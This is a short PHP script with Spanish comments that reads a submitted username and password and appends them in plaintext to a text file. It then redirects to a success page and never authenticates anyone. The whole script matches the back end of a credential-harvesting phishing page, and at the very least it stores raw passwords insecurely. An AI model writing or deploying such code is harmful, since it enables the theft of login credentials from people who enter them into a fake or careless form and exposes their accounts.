<?php
// Verifica si se enviaron datos a través del formulario
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Obtiene los datos del formulario
    $username = $_POST["username"];
    $password = $_POST["password"];

    // Aquí puedes hacer lo que necesites con los datos
    // En este ejemplo, los guardaremos en un archivo de texto

    // Define el nombre del archivo donde se guardarán los datos
    $file = 'datos_login.txt';

    // Abre o crea el archivo en modo de escritura al final del archivo
    $handle = fopen($file, 'a');

    // Escribe los datos en el archivo
    fwrite($handle, "Username: $username\n");
    fwrite($handle, "Password: $password\n");
    fwrite($handle, "-----------------\n");

    // Cierra el archivo
    fclose($handle);

    // Redirige a la página después de procesar los datos
    header("Location: pagina_exito.html");
    exit; // Asegura que el script se detenga después de redirigir
}
?>
